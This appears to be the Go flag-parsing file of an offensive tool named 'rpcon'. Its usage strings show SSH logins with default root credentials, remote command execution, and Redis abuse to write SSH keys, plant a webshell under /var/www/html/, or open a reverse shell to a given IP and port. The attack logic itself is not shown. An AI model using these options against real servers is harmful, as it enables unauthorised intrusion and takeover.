package common

import "flag"

func Flag() {
	flag.StringVar(&Host, "h", "", "host | -h 192.168.1.1")
	flag.IntVar(&Port, "p", 22, "port | ssh -p 22")
	flag.StringVar(&User, "u", "", "user | root")
	flag.StringVar(&Password, "pw", "", "password | rpcon -h 192.168.1.1 -p 22 -u root -pw root")
	flag.StringVar(&Code, "c", "", "code | rpcon -h 192.168.1.1 -p 22 -u root -pw root -c whoami\nfor redis\n -c wk write key\n -c wshell write webshell\n -c shell -ws 192.168.1.1 -wp 666")
	flag.StringVar(&Domain, "domain", "", "")
	flag.StringVar(&Hash, "hash", "", "")
	flag.StringVar(&Method, "m", "", "method | rpcon -h 192.168.1.1:22 -u root -p root -m ssh -c id")
	flag.StringVar(&Redis, "r", "", "sql shell | -r rk | -r rs")
	flag.StringVar(&Path, "pt", "/var/www/html/", "path")
	flag.StringVar(&Wshell, "ws", "", "ws 反弹shell的ip")
	flag.StringVar(&Wport, "wp", "", "wp 反弹shell的端口")
	flag.StringVar(&File, "f", "", "filename")
	flag.Parse()
}
